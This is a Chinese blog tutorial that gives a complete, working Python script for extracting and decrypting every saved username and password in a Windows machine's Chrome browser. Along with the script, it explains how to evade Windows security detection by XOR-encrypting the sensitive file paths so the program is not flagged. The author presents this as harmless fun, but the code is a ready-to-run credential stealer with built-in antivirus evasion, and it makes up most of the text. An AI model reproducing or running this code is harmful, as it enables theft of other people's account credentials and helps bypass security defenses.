最近有一个需求，那就是快速获取一台计算机上的 chrome 浏览器的用户名和密码，并无恶意，单纯感觉很好玩而已。

---



## 基本原理

Chrome 浏览器的用户密码存储在下面这个路径的文件里面（以 Windows 为例）：

```
~/AppData/Local/Google/Chrome/User Data/Default/Login Data
```

这是一个 sqlite3 数据库文件。网站对应的密码存储在名为 `logins` 的表格中，当我们连接这个数据库后，使用如下语句即可访问每一条网站，用户名和密码，这个三元组：

```sql
SELECT action_url, username_value, password_value FROM logins
```

但是其中的 `password_value` 并不是明文，而是通过 [AES 加密算法](https://blog.csdn.net/qq_28205153/article/details/55798628) 加密后的结果，解密这个密码的密钥在下面这个路径上（以 Windows 为例）：

```
~/AppData/Local/Google/Chrome/User Data/Local State
```

这是一个 json 文件，`utf-8` 编码，直接读就行。

---

## 安全检查绕行

有的同学已经跃跃欲试了，如果你正在使用最新版本的 win11，那么你会发现，你的程序不凑效了，控制台一直报错 invalid argument，这是为什么呢？

<div align=center>
<img src="https://pica.zhimg.com/80/v2-b091d6a34b96267be3243e9c68a22704_1440w.jpeg" style="width: 30%;"/>
</div>

通过多次实践，我发现了这是因为 Windows 自身的安全防御机制，我们的程序中包含了 `~/AppData/Local/Google/Chrome/User Data/Default/Login Data` 这样的敏感路径信息，所以引起了 Windows 保护程序的警觉，从而终止了我们的渗透程序。

<div align=center>
<img src="https://pic1.zhimg.com/80/v2-3d7440c2233aee146134b5973e27ce0f_1440w.png" style="width: 60%;"/>
</div>

那么要如何做呢？简单呀，既然你能检测到敏感到敏感字符串，那么试问我用对称加密算法事先加密敏感内容，运行时进行解密，阁下又该如何应对？此处我们使用最简单的 XOR 加密，密钥使用“锦恢”，加密解雇如下：

```python
# /AppData/Local/Google/Chrome/User Data/Default/Login Data
LOGIN_DATA = '锉怣镖怒镢怃镒怃锉怮镉态镇怎锉急镉怍镁怎镃恍镥怊镔怍镋怇锉怷镕怇镔恂镢怃镒怃锉怦镃怄镇怗镊怖锉怮镉怅镏怌锆怦镇怖镇'
# /AppData/Local/Google/Chrome/User Data/Local State
LOCAL_STATE = '锉怣镖怒镢怃镒怃锉怮镉态镇怎锉急镉怍镁怎镃恍镥怊镔怍镋怇锉怷镕怇镔恂镢怃镒怃锉怮镉态镇怎锆怱镒怃镒怇'
```

---

## 程序与运行

我们的加密程序如下，保存为 `chrome.py`：

```python
import os
import shutil
import sqlite3, win32crypt
import json
import base64
import argparse
# pip install pycryptodomex
from Cryptodome.Cipher import AES
import prettytable

def encrypt_decrypt(data: str, key: str) -> str:
    return ''.join([chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data))])

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        print("无法解码：", buff)
    
parser = argparse.ArgumentParser()
parser.add_argument('--key', required=True, type=str)
args = parser.parse_args()
key = args.key

LOGIN_DATA = '锉怣镖怒镢怃镒怃锉怮镉态镇怎锉急镉怍镁怎镃恍镥怊镔怍镋怇锉怷镕怇镔恂镢怃镒怃锉怦镃怄镇怗镊怖锉怮镉怅镏怌锆怦镇怖镇'
LOCAL_STATE = '锉怣镖怒镢怃镒怃锉怮镉态镇怎锉急镉怍镁怎镃恍镥怊镔怍镋怇锉怷镕怇镔恂镢怃镒怃锉怮镉态镇怎锆怱镒怃镒怇'

if not os.path.exists('login.sqlite'):
    database_path = os.path.expanduser('~') + encrypt_decrypt(LOGIN_DATA, key)
    shutil.copy(database_path, 'login.sqlite')

if not os.path.exists('Local State'):
    local_state_path = os.path.expanduser('~') + encrypt_decrypt(LOCAL_STATE, key)
    shutil.copy(local_state_path, 'Local State')

with open('Local State', 'r') as fp:
    local_state = json.load(fp)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

conn = sqlite3.connect('login.sqlite')
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')

table = prettytable.PrettyTable(field_names=['site', 'username', 'password'])

for result in cursor.fetchall():
    site = result[0]
    username = result[1]
    password = decrypt_password(result[2], master_key)
    table.add_row([site, username, password])

print(table)
```

运行如下：

```python
python chrome.py --key "锦恢"
```

效果如下：

<div align=center>
<img src="https://pic1.zhimg.com/80/v2-cf6051f3654ae32951e5cc2df6c7303e_1440w.png" style="width: 70%;"/>
</div>

玩的开心！